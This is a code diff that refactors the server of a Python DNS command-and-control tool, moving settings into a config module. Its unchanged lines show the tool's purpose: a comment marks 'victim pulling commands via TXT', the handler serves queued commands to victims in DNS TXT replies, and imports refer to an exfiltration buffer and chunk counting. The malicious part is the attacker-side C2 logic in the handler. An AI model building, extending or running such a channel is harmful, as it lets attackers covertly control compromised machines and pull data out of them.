@@ -1,7 +1,10 @@
-import socketserver, threading, binascii
+import binascii
+import socketserver
+import threading
 from dnslib import DNSRecord, QTYPE, RR, A, TXT
-from config import DNS_PORT, DNS_DOMAIN
-from utils.tools import command_queue, exfil_buffer, expected_chunks
+import config as cfg
+
+# ----------------------------------- DNS ----------------------------------- #
 
 class DNSHandler(socketserver.BaseRequestHandler):
     def handle(self):
@@ -17,9 +20,9 @@ class DNSHandler(socketserver.BaseRequestHandler):
         reply = req.reply()
        
         # Victim pulling commands via TXT
-        if qtype == "TXT" and qname == f"command.{DNS_DOMAIN}":
-            if command_queue:
-                cmd = command_queue.pop(0)
+        if qtype == "TXT" and qname == f"command.{cfg.DNS_DOMAIN}":
+            if cfg.command_queue:
+                cmd = cfg.command_queue.pop(0)
                 print(f"📤 [dns-cmd] sending: {cmd!r}")
                 reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=0))
             try:
@@ -53,6 +56,6 @@ class DNSHandler(socketserver.BaseRequestHandler):
 
 
 def start_dns_server():
-    server = socketserver.ThreadingUDPServer(('0.0.0.0', DNS_PORT), DNSHandler)
+    server = socketserver.ThreadingUDPServer(('0.0.0.0', cfg.DNS_PORT), DNSHandler)
     threading.Thread(target=server.serve_forever, daemon=True).start()
-    print(f"🚧 DNS server listening on UDP/53 for domain {DNS_DOMAIN}")
+    print(f"🚧 DNS server listening on UDP/53 for domain {cfg.DNS_DOMAIN}")
